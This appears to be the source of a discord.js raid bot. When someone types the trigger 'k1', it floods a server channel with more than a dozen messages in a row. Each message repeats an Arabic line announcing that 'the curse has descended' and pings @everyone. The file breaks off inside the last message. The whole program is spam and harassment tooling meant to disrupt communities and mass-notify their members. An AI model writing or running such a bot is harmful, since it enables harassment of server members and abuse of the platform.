
const Discord = require("discord.js");
const LOka = new Discord.Client();
console.log('mhstr special on');
LOka.on('ready', () => {
  console.log(`Logged in as ${LOka.user.tag} !`);

});

LOka.on('message', message => {
     if (message.content === "k1") {
           if(!message.channel.guild) return;

message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
@everyone
**`
);
message.channel.send(`  **
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
إنتهى زمآن الصمت وححلت اللعنةة ’$
